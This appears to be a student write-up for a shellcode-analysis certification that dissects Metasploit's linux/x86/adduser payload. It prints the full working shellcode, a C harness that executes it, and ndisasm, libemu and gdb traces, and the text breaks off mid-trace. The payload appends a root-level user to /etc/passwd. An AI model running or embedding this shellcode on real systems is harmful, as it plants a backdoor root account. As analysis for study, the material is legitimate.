# SLAE Assignment #5

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online‐courses/securitytube-linux-assembly-expert/

Student ID: SLAE-935

## Assignment

* Take up at least 3 shellcode samples created using Msfpayload for linux/x86
* Use GDB/Ndisasm/Libemu to dissect the functionality of the shellcode
* Present your analysis

## Listing shellcodes

let's list all shellcodes available in kali

```
root@0802ed4415ba:/# msfvenom -l payloads |grep "linux/x86"
    linux/x86/adduser                                   Create a new user with UID 0
    linux/x86/chmod                                     Runs chmod on specified file with specified mode
    linux/x86/exec                                      Execute an arbitrary command
    linux/x86/meterpreter/bind_ipv6_tcp                 Inject the mettle server payload (staged). Listen for an IPv6 connection (Linux x86)
    linux/x86/meterpreter/bind_ipv6_tcp_uuid            Inject the mettle server payload (staged). Listen for an IPv6 connection with UUID Support (Linux x86)
    linux/x86/meterpreter/bind_nonx_tcp                 Inject the mettle server payload (staged). Listen for a connection
    linux/x86/meterpreter/bind_tcp                      Inject the mettle server payload (staged). Listen for a connection (Linux x86)
    linux/x86/meterpreter/bind_tcp_uuid                 Inject the mettle server payload (staged). Listen for a connection with UUID Support (Linux x86)
    linux/x86/meterpreter/find_tag                      Inject the mettle server payload (staged). Use an established connection
    linux/x86/meterpreter/reverse_ipv6_tcp              Inject the mettle server payload (staged). Connect back to attacker over IPv6
    linux/x86/meterpreter/reverse_nonx_tcp              Inject the mettle server payload (staged). Connect back to the attacker
    linux/x86/meterpreter/reverse_tcp                   Inject the mettle server payload (staged). Connect back to the attacker
    linux/x86/meterpreter/reverse_tcp_uuid              Inject the mettle server payload (staged). Connect back to the attacker
    linux/x86/meterpreter_reverse_http                  Run the Meterpreter / Mettle server payload (stageless)
    linux/x86/meterpreter_reverse_https                 Run the Meterpreter / Mettle server payload (stageless)
    linux/x86/meterpreter_reverse_tcp                   Run the Meterpreter / Mettle server payload (stageless)
    linux/x86/metsvc_bind_tcp                           Stub payload for interacting with a Meterpreter Service
    linux/x86/metsvc_reverse_tcp                        Stub payload for interacting with a Meterpreter Service
    linux/x86/read_file                                 Read up to 4096 bytes from the local file system and write it back out to the specified file descriptor
    linux/x86/shell/bind_ipv6_tcp                       Spawn a command shell (staged). Listen for an IPv6 connection (Linux x86)
    linux/x86/shell/bind_ipv6_tcp_uuid                  Spawn a command shell (staged). Listen for an IPv6 connection with UUID Support (Linux x86)
    linux/x86/shell/bind_nonx_tcp                       Spawn a command shell (staged). Listen for a connection
    linux/x86/shell/bind_tcp                            Spawn a command shell (staged). Listen for a connection (Linux x86)
    linux/x86/shell/bind_tcp_uuid                       Spawn a command shell (staged). Listen for a connection with UUID Support (Linux x86)
    linux/x86/shell/find_tag                            Spawn a command shell (staged). Use an established connection
    linux/x86/shell/reverse_ipv6_tcp                    Spawn a command shell (staged). Connect back to attacker over IPv6
    linux/x86/shell/reverse_nonx_tcp                    Spawn a command shell (staged). Connect back to the attacker
    linux/x86/shell/reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker
    linux/x86/shell/reverse_tcp_uuid                    Spawn a command shell (staged). Connect back to the attacker
    linux/x86/shell_bind_ipv6_tcp                       Listen for a connection over IPv6 and spawn a command shell
    linux/x86/shell_bind_tcp                            Listen for a connection and spawn a command shell
    linux/x86/shell_bind_tcp_random_port                Listen for a connection in a random port and spawn a command shell. Use nmap to discover the open port: 'nmap -sS target -p-'.
    linux/x86/shell_find_port                           Spawn a shell on an established connection
    linux/x86/shell_find_tag                            Spawn a shell on an established connection (proxy/nat safe)
    linux/x86/shell_reverse_tcp                         Connect back to attacker and spawn a command shell
root@0802ed4415ba:/#
```

## Shellcode 1 Analysis

Shellcode options

```
root@0802ed4415ba:/# msfvenom -p linux/x86/adduser --payload-options
Options for payload/linux/x86/adduser:


       Name: Linux Add User
     Module: payload/linux/x86/adduser
   Platform: Linux
       Arch: x86
Needs Admin: Yes
 Total size: 97
       Rank: Normal

Provided by:
    skape <mmiller@hick.org>
    vlad902 <vlad902@gmail.com>
    spoonm <spoonm@no$email.com>

Basic options:
Name   Current Setting  Required  Description
----   ---------------  --------  -----------
PASS   metasploit       yes       The password for this user
SHELL  /bin/sh          no        The shell for this user
USER   metasploit       yes       The username to create

Description:
  Create a new user with UID 0


Advanced options for payload/linux/x86/adduser:

    Name                Current Setting  Required  Description
    ----                ---------------  --------  -----------
    AppendExit          false            no        Append a stub that executes the exit(0) system call
    PrependChrootBreak  false            no        Prepend a stub that will break out of a chroot (includes setreuid to root)
    PrependFork         false            no        Prepend a stub that executes: if (fork()) { exit(0); }
    PrependSetgid       false            no        Prepend a stub that executes the setgid(0) system call
    PrependSetregid     false            no        Prepend a stub that executes the setregid(0, 0) system call
    PrependSetresgid    false            no        Prepend a stub that executes the setresgid(0, 0, 0) system call
    PrependSetresuid    false            no        Prepend a stub that executes the setresuid(0, 0, 0) system call
    PrependSetreuid     false            no        Prepend a stub that executes the setreuid(0, 0) system call
    PrependSetuid       false            no        Prepend a stub that executes the setuid(0) system call
    VERBOSE             false            no        Enable detailed status messages
    WORKSPACE                            no        Specify the workspace for this module
Evasion options for payload/linux/x86/adduser:

    Name  Current Setting  Required  Description
    ----  ---------------  --------  -----------
root@0802ed4415ba:/# 
```

Shellcode generation:

```
root@0802ed4415ba:/# msfvenom -p linux/x86/adduser --arch x86 --platform linux -f c
No encoder or badchars specified, outputting raw payload
Payload size: 97 bytes
Final size of c file: 433 bytes
unsigned char buf[] = 
"\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51"
"\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63"
"\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x28\x00\x00\x00\x6d\x65"
"\x74\x61\x73\x70\x6c\x6f\x69\x74\x3a\x41\x7a\x2f\x64\x49\x73"
"\x6a\x34\x70\x34\x49\x52\x63\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a"
"\x2f\x62\x69\x6e\x2f\x73\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58"
"\xcd\x80\x6a\x01\x58\xcd\x80";
root@0802ed4415ba:/# 
```

Shellcode opcodes:

```
$ echo -ne "\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x28\x00\x00\x00\x6d\x65\x74\x61\x73\x70\x6c\x6f\x69\x74\x3a\x41\x7a\x2f\x64\x49\x73\x6a\x34\x70\x34\x49\x52\x63\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a\x2f\x62\x69\x6e\x2f\x73\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58\xcd\x80\x6a\x01\x58\xcd\x80"| ndisasm -u -
00000000  31C9              xor ecx,ecx
00000002  89CB              mov ebx,ecx
00000004  6A46              push byte +0x46
00000006  58                pop eax
00000007  CD80              int 0x80 ; sys_setreuid16 (EAX=0x46, EBX=0, ECX=0) - elevate to root
00000009  6A05              push byte +0x5
0000000B  58                pop eax
0000000C  31C9              xor ecx,ecx
0000000E  51                push ecx ; '/0' null
0000000F  6873737764        push dword 0x64777373 ; dws 
00000014  682F2F7061        push dword 0x61702f2f ; sap/
00000019  682F657463        push dword 0x6374652f ; /cte/
0000001E  89E3              mov ebx,esp ; ptr /etc/passwd
00000020  41                inc ecx
00000021  B504              mov ch,0x4 ; O_APPEND
00000023  CD80              int 0x80 sys_open (EAX=0x5, EBX=ptr /etc/passwd, ECX=O_APPEND) - open in append /etc/passwd
00000025  93                xchg eax,ebx ; EAX = ptr /etc/passwd, EBX = file ptr /etc/passwd
00000026  E828000000        call dword 0x53
0000002B  6D                insd
0000002C  657461            gs jz 0x90
0000002F  7370              jnc 0xa1
00000031  6C                insb
00000032  6F                outsd
00000033  69743A417A2F6449  imul esi,[edx+edi+0x41],dword 0x49642f7a
0000003B  736A              jnc 0xa7
0000003D  3470              xor al,0x70
0000003F  3449              xor al,0x49
00000041  52                push edx
00000042  633A              arpl [edx],di
00000044  303A              xor [edx],bh
00000046  303A              xor [edx],bh
00000048  3A2F              cmp ch,[edi]
0000004A  3A2F              cmp ch,[edi]
0000004C  62696E            bound ebp,[ecx+0x6e]
0000004F  2F                das
00000050  7368              jnc 0xba
00000052  0A598B            or bl,[ecx-0x75] ; ECX = ptr metasploit:metasploit:0:0::/:/bin/sh
00000055  51                push ecx
00000056  FC                cld
00000057  6A04              push byte +0x4
00000059  58                pop eax
0000005A  CD80              int 0x80 ; sys_write (EAX=0x4, EBX=file ptr /etc/passwd, ECX=ptr metasploit:metasploit:0:0::/:/bin/sh, EDX=lenght of metasploit:metasploit:0:0::/:/bin/sh)
0000005C  6A01              push byte +0x1
0000005E  58                pop eax
0000005F  CD80              int 0x80 ; sys_exit (EAX=0x1, EBX=0)
```

Libemu:

```
root@kali:~# msfvenom -p linux/x86/adduser --arch x86 --platform linux R | /opt/libemu/bin/sctest -vvv -Ss 1000000
verbose = 3
No encoder or badchars specified, outputting raw payload
Payload size: 97 bytes

[emu 0x0x56089fbd14f0 debug ] cpu state    eip=0x00417000
[emu 0x0x56089fbd14f0 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0x56089fbd14f0 debug ] esp=0x00416fce  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x56089fbd14f0 debug ] Flags: 
[emu 0x0x56089fbd14f0 debug ] cpu state    eip=0x00417000
[emu 0x0x56089fbd14f0 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0x56089fbd14f0 debug ] esp=0x00416fce  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x56089fbd14f0 debug ] Flags: 
[emu 0x0x56089fbd14f0 debug ] 31C9                            xor ecx,ecx
[emu 0x0x56089fbd14f0 debug ] cpu state    eip=0x00417002
[emu 0x0x56089fbd14f0 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0x56089fbd14f0 debug ] esp=0x00416fce  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x56089fbd14f0 debug ] Flags: PF ZF 
[emu 0x0x56089fbd14f0 debug ] 89CB                            mov ebx,ecx
[emu 0x0x56089fbd14f0 debug ] cpu state    eip=0x00417004
[emu 0x0x56089fbd14f0 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0x56089fbd14f0 debug ] esp=0x00416fce  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x56089fbd14f0 debug ] Flags: PF ZF 
[emu 0x0x56089fbd14f0 debug ] 6A46                            push byte 0x46
[emu 0x0x56089fbd14f0 debug ] cpu state    eip=0x00417006
[emu 0x0x56089fbd14f0 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0x56089fbd14f0 debug ] esp=0x00416fca  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x56089fbd14f0 debug ] Flags: PF ZF 
[emu 0x0x56089fbd14f0 debug ] 58                              pop eax
[emu 0x0x56089fbd14f0 debug ] cpu state    eip=0x00417007
[emu 0x0x56089fbd14f0 debug ] eax=0x00000046  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0x56089fbd14f0 debug ] esp=0x00416fce  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x56089fbd14f0 debug ] Flags: PF ZF 
[emu 0x0x56089fbd14f0 debug ] CD80                            int 0x80
stepcount 4
[emu 0x0x56089fbd14f0 debug ] cpu state    eip=0x00417009
[emu 0x0x56089fbd14f0 debug ] eax=0x00000046  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0x56089fbd14f0 debug ] esp=0x00416fce  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x56089fbd14f0 debug ] Flags: PF ZF 
root@kali:~# 
```

Let's create a skeleton program:

```
// Filename: shellcode1.c
// Author:  SLAE-935
//
// Shellcode: msfvenom -p linux/x86/adduser --arch x86 --platform linux -f c

#include<stdio.h>
#include<string.h>
unsigned char code[] = \
"\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51"
"\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63"
"\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x28\x00\x00\x00\x6d\x65"
"\x74\x61\x73\x70\x6c\x6f\x69\x74\x3a\x41\x7a\x2f\x64\x49\x73"
"\x6a\x34\x70\x34\x49\x52\x63\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a"
"\x2f\x62\x69\x6e\x2f\x73\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58"
"\xcd\x80\x6a\x01\x58\xcd\x80";
void main()
{
    printf("Shellcode Length:  %d\n", strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}

// Compile with:
// gcc -fno-stack-protector -z execstack shellcode1.c -o shellcode1
```

And compile it:

```
$ gcc -fno-stack-protector -z execstack shellcode1.c -o shellcode1
```

Full GDB dump with comments:

```
$ gdb -q shellcode1
Reading symbols from /slae_code/Assignment 5/shellcode1...(no debugging symbols found)...done.
gdb-peda$ info variables 
All defined variables:

Non-debugging symbols:
0x08048508  _fp_hw
0x0804850c  _IO_stdin_used
0x08048620  __FRAME_END__
0x08049f14  __CTOR_LIST__
0x08049f14  __init_array_end
0x08049f14  __init_array_start
0x08049f18  __CTOR_END__
0x08049f1c  __DTOR_LIST__
0x08049f20  __DTOR_END__
0x08049f24  __JCR_END__
0x08049f24  __JCR_LIST__
0x08049f28  _DYNAMIC
0x08049ff4  _GLOBAL_OFFSET_TABLE_
0x0804a020  __data_start
0x0804a020  data_start
0x0804a024  __dso_handle
0x0804a040  code ; this is the variable where to set breakpoint
0x0804a0a4  completed.6159
0x0804a0a8  dtor_idx.6161
gdb-peda$ b *0x0804a040 ; set breakpoint at the 'code' variable
Breakpoint 1 at 0x804a040
gdb-peda$ r ; run the program that should stop at breakpoint1 at address 0x804a040
Shellcode Length:  40

[----------------------------------registers-----------------------------------]
EAX: 0x804a040 --> 0xcb89c931 
EBX: 0xb7fd1ff4 --> 0x1a0d7c 
ECX: 0x0 
EDX: 0x0 
ESI: 0x0 
EDI: 0x804a069 --> 0x656d0000 ('')
EBP: 0xbffff708 --> 0x0 
ESP: 0xbffff6cc --> 0x8048430 (<main+76>:	mov    edi,DWORD PTR [ebp-0x4])
EIP: 0x804a040 --> 0xcb89c931
EFLAGS: 0x200282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804a03a <__dso_handle+22>:	add    BYTE PTR [eax],al
   0x804a03c <__dso_handle+24>:	add    BYTE PTR [eax],al
   0x804a03e <__dso_handle+26>:	add    BYTE PTR [eax],al
=> 0x804a040 <code>:	xor    ecx,ecx ; zero ecx
   0x804a042 <code+2>:	mov    ebx,ecx
   0x804a044 <code+4>:	push   0x46
   0x804a046 <code+6>:	pop    eax
   0x804a047 <code+7>:	int    0x80
[------------------------------------stack-------------------------------------]
0000| 0xbffff6cc --> 0x8048430 (<main+76>:	mov    edi,DWORD PTR [ebp-0x4])
0004| 0xbffff6d0 --> 0x8048510 ("Shellcode Length:  %d\n")
0008| 0xbffff6d4 --> 0x28 ('(')
0012| 0xbffff6d8 --> 0x8049ff4 --> 0x8049f28 --> 0x1 
0016| 0xbffff6dc --> 0x8048461 (<__libc_csu_init+33>:	lea    eax,[ebx-0xe0])
0020| 0xbffff6e0 --> 0xffffffff 
0024| 0xbffff6e4 --> 0xb7e641a6 (add    ebx,0x16de4e)
0028| 0xbffff6e8 --> 0xb7fd1ff4 --> 0x1a0d7c 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0804a040 in code ()
gdb-peda$ s


[----------------------------------registers-----------------------------------]
EAX: 0x804a040 --> 0xcb89c931 
EBX: 0xb7fd1ff4 --> 0x1a0d7c 
ECX: 0x0 
EDX: 0x0 
ESI: 0x0 
EDI: 0x804a069 --> 0x656d0000 ('')
EBP: 0xbffff708 --> 0x0 
ESP: 0xbffff6cc --> 0x8048430 (<main+76>:	mov    edi,DWORD PTR [ebp-0x4])
EIP: 0x804a042 --> 0x466acb89
EFLAGS: 0x200246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804a03c <__dso_handle+24>:	add    BYTE PTR [eax],al
   0x804a03e <__dso_handle+26>:	add    BYTE PTR [eax],al
   0x804a040 <code>:	xor    ecx,ecx
=> 0x804a042 <code+2>:	mov    ebx,ecx ; zero ebx
   0x804a044 <code+4>:	push   0x46
   0x804a046 <code+6>:	pop    eax
   0x804a047 <code+7>:	int    0x80
   0x804a049 <code+9>:	push   0x5
[------------------------------------stack-------------------------------------]
0000| 0xbffff6cc --> 0x8048430 (<main+76>:	mov    edi,DWORD PTR [ebp-0x4])
0004| 0xbffff6d0 --> 0x8048510 ("Shellcode Length:  %d\n")
0008| 0xbffff6d4 --> 0x28 ('(')
0012| 0xbffff6d8 --> 0x8049ff4 --> 0x8049f28 --> 0x1 
0016| 0xbffff6dc --> 0x8048461 (<__libc_csu_init+33>:	lea    eax,[ebx-0xe0])
0020| 0xbffff6e0 --> 0xffffffff 
0024| 0xbffff6e4 --> 0xb7e641a6 (add    ebx,0x16de4e)
0028| 0xbffff6e8 --> 0xb7fd1ff4 --> 0x1a0d7c 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804a042 in code ()
gdb-peda$ s

[----------------------------------registers-----------------------------------]
EAX: 0x804a040 --> 0xcb89c931 
EBX: 0x0 
ECX: 0x0 
EDX: 0x0 
ESI: 0x0 
EDI: 0x804a069 --> 0x656d0000 ('')
EBP: 0xbffff708 --> 0x0 
ESP: 0xbffff6cc --> 0x8048430 (<main+76>:	mov    edi,DWORD PTR [ebp-0x4])
EIP: 0x804a044 --> 0xcd58466a
EFLAGS: 0x200246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804a03e <__dso_handle+26>:	add    BYTE PTR [eax],al
   0x804a040 <code>:	xor    ecx,ecx
   0x804a042 <code+2>:	mov    ebx,ecx
=> 0x804a044 <code+4>:	push   0x46 ; push 0x46 on the stack (sys_setreuid16)
   0x804a046 <code+6>:	pop    eax
   0x804a047 <code+7>:	int    0x80
   0x804a049 <code+9>:	push   0x5
   0x804a04b <code+11>:	pop    eax
[------------------------------------stack-------------------------------------]
0000| 0xbffff6cc --> 0x8048430 (<main+76>:	mov    edi,DWORD PTR [ebp-0x4])
0004| 0xbffff6d0 --> 0x8048510 ("Shellcode Length:  %d\n")
0008| 0xbffff6d4 --> 0x28 ('(')
0012| 0xbffff6d8 --> 0x8049ff4 --> 0x8049f28 --> 0x1 
0016| 0xbffff6dc --> 0x8048461 (<__libc_csu_init+33>:	lea    eax,[ebx-0xe0])
0020| 0xbffff6e0 --> 0xffffffff 
0024| 0xbffff6e4 --> 0xb7e641a6 (add    ebx,0x16de4e)
0028| 0xbffff6e8 --> 0xb7fd1ff4 --> 0x1a0d7c 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804a044 in code ()
gdb-peda$ s

[----------------------------------registers-----------------------------------]
EAX: 0x804a040 --> 0xcb89c931 
EBX: 0x0 
ECX: 0x0 
EDX: 0x0 
ESI: 0x0 
EDI: 0x804a069 --> 0x656d0000 ('')
EBP: 0xbffff708 --> 0x0 
ESP: 0xbffff6c8 --> 0x46 ('F')
EIP: 0x804a046 --> 0x6a80cd58
EFLAGS: 0x200246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804a040 <code>:	xor    ecx,ecx
   0x804a042 <code+2>:	mov    ebx,ecx
   0x804a044 <code+4>:	push   0x46
=> 0x804a046 <code+6>:	pop    eax ; store 0x46 in eax
   0x804a047 <code+7>:	int    0x80
   0x804a049 <code+9>:	push   0x5
   0x804a04b <code+11>:	pop    eax
   0x804a04c <code+12>:	xor    ecx,ecx
[------------------------------------stack-------------------------------------]
0000| 0xbffff6c8 --> 0x46 ('F') ; 0x46 previously pushed (sys_setreuid16)
0004| 0xbffff6cc --> 0x8048430 (<main+76>:	mov    edi,DWORD PTR [ebp-0x4])
0008| 0xbffff6d0 --> 0x8048510 ("Shellcode Length:  %d\n")
0012| 0xbffff6d4 --> 0x28 ('(')
0016| 0xbffff6d8 --> 0x8049ff4 --> 0x8049f28 --> 0x1 
0020| 0xbffff6dc --> 0x8048461 (<__libc_csu_init+33>:	lea    eax,[ebx-0xe0])
0024| 0xbffff6e0 --> 0xffffffff 
0028| 0xbffff6e4 --> 0xb7e641a6 (add    ebx,0x16de4e)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804a046 in code ()
gdb-peda$ s

[----------------------------------registers-----------------------------------]
EAX: 0x46 ('F') ; retrieved from the stack
EBX: 0x0 
ECX: 0x0 
EDX: 0x0 
ESI: 0x0 
EDI: 0x804a069 --> 0x656d0000 ('')
EBP: 0xbffff708 --> 0x0 
ESP: 0xbffff6cc --> 0x8048430 (<main+76>:	mov    edi,DWORD PTR [ebp-0x4])
EIP: 0x804a047 --> 0x56a80cd
EFLAGS: 0x200246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804a042 <code+2>:	mov    ebx,ecx
   0x804a044 <code+4>:	push   0x46
   0x804a046 <code+6>:	pop    eax
=> 0x804a047 <code+7>:	int    0x80 ; call sys_setreuid16
   0x804a049 <code+9>:	push   0x5
   0x804a04b <code+11>:	pop    eax
   0x804a04c <code+12>:	xor    ecx,ecx
   0x804a04e <code+14>:	push   ecx
[------------------------------------stack-------------------------------------]
0000| 0xbffff6cc --> 0x8048430 (<main+76>:	mov    edi,DWORD PTR [ebp-0x4])
0004| 0xbffff6d0 --> 0x8048510 ("Shellcode Length:  %d\n")
0008| 0xbffff6d4 --> 0x28 ('(')
0012| 0xbffff6d8 --> 0x8049ff4 --> 0x8049f28 --> 0x1 
0016| 0xbffff6dc --> 0x8048461 (<__libc_csu_init+33>:	lea    eax,[ebx-0xe0])
0020| 0xbffff6e0 --> 0xffffffff 
0024| 0xbffff6e4 --> 0xb7e641a6 (add    ebx,0x16de4e)
0028| 0xbffff6e8 --> 0xb7fd1ff4 --> 0x1a0d7c 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804a047 in code ()
gdb-peda$ s

[----------------------------------registers-----------------------------------]
EAX: 0xffffffff 
EBX: 0x0 
ECX: 0x0 
EDX: 0x0 
ESI: 0x0 
EDI: 0x804a069 --> 0x656d0000 ('')
EBP: 0xbffff708 --> 0x0 
ESP: 0xbffff6cc --> 0x8048430 (<main+76>:	mov    edi,DWORD PTR [ebp-0x4])
EIP: 0x804a049 --> 0x3158056a
EFLAGS: 0x200246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804a044 <code+4>:	push   0x46
   0x804a046 <code+6>:	pop    eax
   0x804a047 <code+7>:	int    0x80
=> 0x804a049 <code+9>:	push   0x5 ; push 5 on the stack (sys_open)
   0x804a04b <code+11>:	pop    eax
   0x804a04c <code+12>:	xor    ecx,ecx
   0x804a04e <code+14>:	push   ecx
   0x804a04f <code+15>:	push   0x64777373
[------------------------------------stack-------------------------------------]
0000| 0xbffff6cc --> 0x8048430 (<main+76>:	mov    edi,DWORD PTR [ebp-0x4])
0004| 0xbffff6d0 --> 0x8048510 ("Shellcode Length:  %d\n")
0008| 0xbffff6d4 --> 0x28 ('(')
0012| 0xbffff6d8 --> 0x8049ff4 --> 0x8049f28 --> 0x1 
0016| 0xbffff6dc --> 0x8048461 (<__libc_csu_init+33>:	lea    eax,[ebx-0xe0])
0020| 0xbffff6e0 --> 0xffffffff 
0024| 0xbffff6e4 --> 0xb7e641a6 (add    ebx,0x16de4e)
0028| 0xbffff6e8 --> 0xb7fd1ff4 --> 0x1a0d7c 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804a049 in code ()
gdb-peda$ s

[----------------------------------registers-----------------------------------]
EAX: 0xffffffff 
EBX: 0x0 
ECX: 0x0 
EDX: 0x0 
ESI: 0x0 
EDI: 0x804a069 --> 0x656d0000 ('')
EBP: 0xbffff708 --> 0x0 
ESP: 0xbffff6c8 --> 0x5 
EIP: 0x804a04b --> 0x51c93158
EFLAGS: 0x200246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804a046 <code+6>:	pop    eax
   0x804a047 <code+7>:	int    0x80
   0x804a049 <code+9>:	push   0x5
=> 0x804a04b <code+11>:	pop    eax ; store 0x5 (sys_open) in EAX
   0x804a04c <code+12>:	xor    ecx,ecx
   0x804a04e <code+14>:	push   ecx
   0x804a04f <code+15>:	push   0x64777373
   0x804a054 <code+20>:	push   0x61702f2f
[------------------------------------stack-------------------------------------]
0000| 0xbffff6c8 --> 0x5 ; previously pushed (sys_open)
0004| 0xbffff6cc --> 0x8048430 (<main+76>:	mov    edi,DWORD PTR [ebp-0x4])
0008| 0xbffff6d0 --> 0x8048510 ("Shellcode Length:  %d\n")
0012| 0xbffff6d4 --> 0x28 ('(')
0016| 0xbffff6d8 --> 0x8049ff4 --> 0x8049f28 --> 0x1 
0020| 0xbffff6dc --> 0x8048461 (<__libc_csu_init+33>:	lea    eax,[ebx-0xe0])
0024| 0xbffff6e0 --> 0xffffffff 
0028| 0xbffff6e4 --> 0xb7e641a6 (add    ebx,0x16de4e)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804a04b in code ()
gdb-peda$ s

[----------------------------------registers-----------------------------------]
EAX: 0x5 
EBX: 0x0 
ECX: 0x0 
EDX: 0x0 
ESI: 0x0 
EDI: 0x804a069 --> 0x656d0000 ('')
EBP: 0xbffff708 --> 0x0 
ESP: 0xbffff6cc --> 0x8048430 (<main+76>:	mov    edi,DWORD PTR [ebp-0x4])
EIP: 0x804a04c --> 0x6851c931
EFLAGS: 0x200246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804a047 <code+7>:	int    0x80
   0x804a049 <code+9>:	push   0x5
   0x804a04b <code+11>:	pop    eax
=> 0x804a04c <code+12>:	xor    ecx,ecx ; zero ECX
   0x804a04e <code+14>:	push   ecx
   0x804a04f <code+15>:	push   0x64777373
   0x804a054 <code+20>:	push   0x61702f2f
   0x804a059 <code+25>:	push   0x6374652f
[------------------------------------stack-------------------------------------]
0000| 0xbffff6cc --> 0x8048430 (<main+76>:	mov    edi,DWORD PTR [ebp-0x4])
0004| 0xbffff6d0 --> 0x8048510 ("Shellcode Length:  %d\n")
0008| 0xbffff6d4 --> 0x28 ('(')
0012| 0xbffff6d8 --> 0x8049ff4 --> 0x8049f28 --> 0x1 
0016| 0xbffff6dc --> 0x8048461 (<__libc_csu_init+33>:	lea    eax,[ebx-0xe0])
0020| 0xbffff6e0 --> 0xffffffff 
0024| 0xbffff6e4 --> 0xb7e641a6 (add    ebx,0x16de4e)
0028| 0xbffff6e8 --> 0xb7fd1ff4 --> 0x1a0d7c 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804a04c in code ()
gdb-peda$ s

[----------------------------------registers-----------------------------------]
EAX: 0x5 
EBX: 0x0 
ECX: 0x0 
EDX: 0x0 
ESI: 0x0 
EDI: 0x804a069 --> 0x656d0000 ('')
EBP: 0xbffff708 --> 0x0 
ESP: 0xbffff6cc --> 0x8048430 (<main+76>:	mov    edi,DWORD PTR [ebp-0x4])
EIP: 0x804a04e ("Qhsswdh//pah/etc\211?A?\004?\200\223?(")
EFLAGS: 0x200246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804a049 <code+9>:	push   0x5
   0x804a04b <code+11>:	pop    eax
   0x804a04c <code+12>:	xor    ecx,ecx
=> 0x804a04e <code+14>:	push   ecx ; push null on the stack
   0x804a04f <code+15>:	push   0x64777373
   0x804a054 <code+20>:	push   0x61702f2f
   0x804a059 <code+25>:	push   0x6374652f
   0x804a05e <code+30>:	mov    ebx,esp
[------------------------------------stack-------------------------------------]
0000| 0xbffff6cc --> 0x8048430 (<main+76>:	mov    edi,DWORD PTR [ebp-0x4])
0004| 0xbffff6d0 --> 0x8048510 ("Shellcode Length:  %d\n")
0008| 0xbffff6d4 --> 0x28 ('(')
0012| 0xbffff6d8 --> 0x8049ff4 --> 0x8049f28 --> 0x1 
0016| 0xbffff6dc --> 0x8048461 (<__libc_csu_init+33>:	lea    eax,[ebx-0xe0])
0020| 0xbffff6e0 --> 0xffffffff 
0024| 0xbffff6e4 --> 0xb7e641a6 (add    ebx,0x16de4e)
0028| 0xbffff6e8 --> 0xb7fd1ff4 --> 0x1a0d7c 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804a04e in code ()
gdb-peda$ s


[----------------------------------registers-----------------------------------]
EAX: 0x5 
EBX: 0x0 
ECX: 0x0 
EDX: 0x0 
ESI: 0x0 
EDI: 0x804a069 --> 0x656d0000 ('')
EBP: 0xbffff708 --> 0x0 
ESP: 0xbffff6c8 --> 0x0 
EIP: 0x804a04f ("hsswdh//pah/etc\211?A?\004?\200\223?(")
EFLAGS: 0x200246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
